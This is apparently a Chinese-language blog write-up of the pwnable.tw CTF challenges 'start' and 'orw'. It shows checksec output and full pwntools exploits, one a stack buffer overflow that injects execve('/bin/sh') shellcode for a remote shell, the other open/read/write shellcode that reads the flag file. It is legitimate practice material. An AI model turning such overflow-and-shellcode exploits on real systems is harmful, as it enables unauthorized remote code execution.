---
title: "pwnable.tw_start&orw_writeup"
description: "challenge: start&orw"
pubDate: 2026-04-03
heroImage: "../../assets/blog-placeholder-1.jpg"
---
先說為什麼會突然想打pwnable.tw，因為我之前跟朋友說我只會寫pwnable web，突發奇想查了一下發現有pwnable.tw就立了一個目標：4/1 ~ 4/11要把pwnable.tw打到2000分，~~現在覺得根本找死因為我中間還要去畢旅而且我rev爛到有剩~~，然後中間還有搞社團的事所以write-up寫比較慢，就像你看到這篇還沒有完善
## start
##### discription: Just a start
題目給了ELF跟nc的資訊，先`checksec`一下開了哪些防護，btw要記得chmod，我這兩題都忘記chmod海鰻好笑的
##### checksec
```
$ checksec start
[*] '/home/chiehhhhh/pwnable_tw/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
~~不愧是start一個都沒開~~  
那就連一下看看，總之就是丟一個Let's start the CTF: 然後讓使用者輸入  
反正我看到就往簡單的地方去想應該是BOF，然後發現確實

##### exploit
```
from pwn import *

r = remote('chall.pwnable.tw', '10000')

write = 0x08048087
p1 = b'A'*20 + p32(write)
r.sendafter(b':', p1)
old_esp = u32(r.recv(4))
r.recv()
print(hex(old_esp))

shell = '''
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb
int 0x80
'''

p2 = b'A'*20 + p32(old_esp + 20) + asm(shell)
r.send(p2)
r.interactive()
```
## orw
##### discription: Just a start
##### checksec
```
$ checksec orw
[*] '/home/chiehhhhh/pwnable_tw/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
##### exploit
```
from pwn import *

r = remote('chall.pwnable.tw', '10001')

shellcode ='''
mov eax, 0x05
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80 

mov ebx, eax
mov eax, 0x03
mov ecx, esp 
mov edx, 0x40 
int 0x80 

xor ebx, ebx
inc ebx 
mov eax, 0x04
int 0x80
'''

r.sendafter(b':', asm(shellcode))
flag = r.recv(0x40)
print(flag)
r.interactive()
```